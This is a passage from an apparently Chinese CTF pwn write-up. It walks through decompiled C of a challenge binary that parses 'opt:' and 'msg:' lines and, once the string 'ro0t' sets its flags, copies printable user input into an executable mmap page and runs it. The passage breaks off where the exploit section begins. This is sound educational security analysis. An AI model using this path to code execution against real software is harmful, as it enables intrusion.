class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *ptr2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">      *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  *ptr = <span class="number">0</span>;</span><br><span class="line">  sa = (<span class="type">char</span> *)(ptr + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一串代码看着让人怀疑人生，因此分段分析，主要分为3部分，1：初始化，2：判断字符串格式并将相应位置的值传进去，3：便是switch，功能函数</p><h3 id="判断字符串格式"><a href="#判断字符串格式" class="headerlink" title="判断字符串格式"></a>判断字符串格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">        *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">        *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dest )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个判断就占大部分的代码段，建议放在逆向里（bushi</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )    <span class="comment">//判断次数即遍历次数</span></span><br><span class="line">    qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sb )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">    *sc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !*sc )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">    qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sd )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sd = <span class="number">0</span>;</span><br><span class="line">ptr = sd + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    *ptr++ = <span class="number">0</span>;</span><br><span class="line">ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>首先qword_202040数组的第一个参数是传进来的字符串的开头，然后sb便是字符串中<code>：</code>的下一个字符，之后sc就是sb之后的正常的可读字符，然后qword_202040的第二个参数就是sc，即<code>：</code>后的可读字符，然后再找到sc之后即：后面的一个<code>\n</code>，存进sd里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dest )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">&#125;</span><br><span class="line">++v8;</span><br></pre></td></tr></table></figure><p>之后就是判断字符串的开头必须是msg或者opt然后跟上<code>：</code>，<code>：</code>之后就是dest或v7的值</p><p>从而得知格式要求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt:v7\nmsg:dest\n  或者msg:dest\nopt:v7\n</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();</span><br><span class="line">    dest = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">char</span> *)&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求是unk_202024这个上面的值要为真，进而会执行dest上的函数，之前的mmap是为了让执行段可执行，映射到内存里，不然一直都在栈上显然是不可以执行的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然要先传进去ro0t但是它上面传输的字节其实是少传一个字节因此要多传一个无用字节</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span 